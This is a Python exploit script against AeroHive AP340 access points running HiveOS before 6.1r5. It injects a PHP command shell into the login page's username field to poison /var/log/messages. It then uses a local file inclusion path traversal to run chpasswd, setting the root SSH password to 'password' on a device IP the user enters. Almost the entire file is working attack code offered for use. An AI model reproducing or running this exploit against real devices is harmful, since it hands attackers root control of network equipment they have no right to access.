# -*- coding:utf-8 -*-
# TARGET: AeroHive AP340 HiveOS < 6.1r5
# Confirmed working on AP340 HiveOS 6.1r2
# This program uses a local file inclusion vulnerability
# 1. Poison the log file in /var/log/messages by injecting PHP code into the
#    username field of the login page
# 2. Call the uploaded PHP shell with the LFI URL, changing the root password for SSH
# 3. Login with SSH as root using password "password"

import sys
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import urllib

# Payload to poison the log file at /var/log/messages
# Note if you mess up and get invalid syntax errors just reboot AP it
# will erase/rotate the logs

payload_inject = "<?php if(isset($_REQUEST[\'cmd\'])){     $cmd = ($_REQUEST[\"cmd\"]);     system($cmd);     echo \"</pre>$cmd<pre>\";     die; } ?>"

# URL of the login page where we will inject our PHP command exec code so it poisons the log file
post_url = "/login.php5?version=6.1r2"
post_fields = {"login_auth": "1", "miniHiveUI": "1", "userName": payload_inject, "password": "1234"}
post_fields = urllib.parse.urlencode(post_fields)
data = post_fields.encode('ascii')

# Payload to call the injected PHP code
payload_lfi_url = "/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd="

# Payload to change the root SSH user password
payload_command = "echo+root:password+|+/usr/sbin/chpasswd"

# Combined payload to change password using LFrI
payload_chpasswd = payload_lfi_url + payload_command

print("\n* * * * * AeroHive AP340 HiveOS < 6.1r2 Root Exploit * * * * *\n")

# Get target URL from user
print("\nPlease enter the IP address of the AeroHive AP340 ex: 192.168.1.1\n")
wap_ip = input(">>> ")
base_url = "http://" + wap_ip

# Poison log file with POST to login page
# json_data = json.dumps(post_fields).encode("utf8")
# request = urllib.request.Request(base_url+post_url, post_fields)
print ("Poisoning log file at /var/log/messages. . .")
request = urllib.request.Request(base_url + post_url, data)
json = urlopen(request).read().decode()

# Change the command with LFI->command execution
print("Interacting with PHP shell to change root password. . .")
content = urllib.request.urlopen(base_url + payload_chpasswd).read()
if "Password for " in content.decode('ascii'):
	print("Success!")
	print("Now try to log in with root:password via SSH!")
else:
	print("Exploit Failed")